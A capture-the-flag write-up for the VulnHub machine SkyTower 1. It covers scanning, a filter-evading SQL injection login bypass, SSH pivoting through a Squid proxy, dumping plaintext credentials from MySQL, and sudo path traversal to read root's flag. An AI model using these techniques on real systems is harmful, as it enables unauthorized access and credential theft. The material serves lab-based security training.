# Information

- Name: Sky Tower 1
- Date Release: 26 Jun 2014
- Author: Telspace
- Series: SkyTower
- Platform: VulnHub
- Link: https://www.vulnhub.com/entry/skytower-1,96/
- Difficulty: Easy-Intermediate

# Write Up
## Enum
### Host Discovery
Host Discovery is performed using [arpScan](https://github.com/aalmeidar/Tools). In this lab, the machine ip is _10.0.2.20_.
```Console
# python arpScan.py -r 10.0.2.0/24 -m 2
[*] 52:54:00:12:35:00 10.0.2.1
[*] 52:54:00:12:35:00 10.0.2.2
[*] 08:00:27:dd:df:dc 10.0.2.3
[*] 08:00:27:54:4a:37 10.0.2.20

```
### Port Scanning 
Port Scanning is realized with [portScan](https://github.com/aalmeidar/Tools) and nmap. _portScan_report that are open 2 ports:
```Console
# python portScanner.py -i 10.0.2.20   
[*] Port 80 (http) open
[*] Port 3128 (unknown) open
```
With nmap lets check the version and filtered ports:
```Console
# nmap -sS -p- -Pn -n --min-rate 5000 10.0.2.20
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 19:51 CEST
Nmap scan report for 10.0.2.20
Host is up (0.00017s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   filtered ssh
80/tcp   open     http
3128/tcp open     squid-http
MAC Address: 08:00:27:54:4A:37 (Oracle VirtualBox virtual NIC)
``` 
```Console
# nmap -sV -p80,3128 -oN portScanning 10.0.2.20
Nmap scan report for 10.0.2.20 (10.0.2.20)
Host is up (0.00038s latency).

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.2.22 ((Debian))
3128/tcp open  http-proxy Squid http proxy 3.1.20
MAC Address: 08:00:27:54:4A:37 (Oracle VirtualBox virtual NIC)

```

So there are a proxy, web and filtered ssh that maybe is accesible via proxy.

### Web
There is a login in _index.html_:
![Index](images/index.png)

But, first, lets do fuzzing with _gobuster_ to discover hidden directories and files:
```Console
# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.2.20 -x .php,.txt,-html -t 100 -o fuzzing_index_proxy      
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.20
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,-html
[+] Timeout:                 10s
===============================================================
2022/09/04 19:57:04 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 1136]
/login.php            (Status: 200) [Size: 21]  
/background           (Status: 200) [Size: 2572609]
/background2          (Status: 200) [Size: 2831446]
/server-status        (Status: 403) [Size: 290]
```

Nothing interesting, let's try SQLi with ':
![SQLi Error](images/sqli_error.png)
## Exploitation
After a few attempts, I have noticed that there is a filter. For example, the strings 'or','select', ... are filtered. So, let's try with 'OorR' because the filter is going to remove 'or' and will leave the string 'OR'. The injection is as follows:

```sql
' OorR 1=1#
```

And is successful:

![sqli](sqli.png)

So we have ssh credentials. Let's add the proxy to proxychains:
```Console
# sudo echo "http 10.0.2.20 3128" >> /etc/proxychains4.conf 
# tail -n 3 /etc/proxychains4.conf                         

# defaults set to "tor"
#socks4         127.0.0.1 9050
http 10.0.2.20 3128

```

```Console
# proxychains4 ssh john@10.0.2.20
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  10.0.2.20:3128  ...  10.0.2.20:22  ...  OK
john@10.0.2.20's password: 
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep  4 11:52:57 2022 from 10.0.2.20

Funds have been withdrawn
Connection to 10.0.2.20 closed.

```
Now the connection is closed, for bypass this append /bin/bash:

```Console
# proxychains4 ssh john@10.0.2.20 /bin/bash
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  10.0.2.20:3128  ...  10.0.2.20:22  ...  OK
john@10.0.2.20's password: 
whoami
john
id
uid=1000(john) gid=1000(john) groups=1000(john)

```
## Privilege Escalation
In _login.php_ there are credentials for mysql (note: i can't get a full tty):

```Console
cat /var/www/login.php
<?php

$db = new mysqli('localhost', 'root', 'root', 'SkyTech');
...
...
...

```

Let's dump the database (mysql return me error if i dont put the input in command line):

```Console
# mysql -uroot -proot -e "use SkyTech; show tables;"
Tables_in_SkyTech
login
# mysql -uroot -proot -e "use SkyTech; select * from login;"
id      email   password
1       john@skytech.com        hereisjohn
2       sara@skytech.com        ihatethisjob
3       william@skytech.com     senseable
```
Let's try login with new users:

```Console
proxychains4 ssh sara@10.0.2.20 /bin/bash
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  10.0.2.20:3128  ...  10.0.2.20:22  ...  OK
sara@10.0.2.20's password: 
whoami
sara
id
uid=1001(sara) gid=1001(sara) groups=1001(sara)
sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*

```
The creds for sara are correct but williams creds didn't work. Sara can execute as sudo cat and ls on /accounts. So, we can execute ls and cat on /root using _.._ for parent directory:

```Console
# sudo ls /accounts/../root
flag.txt
# sudo cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
```
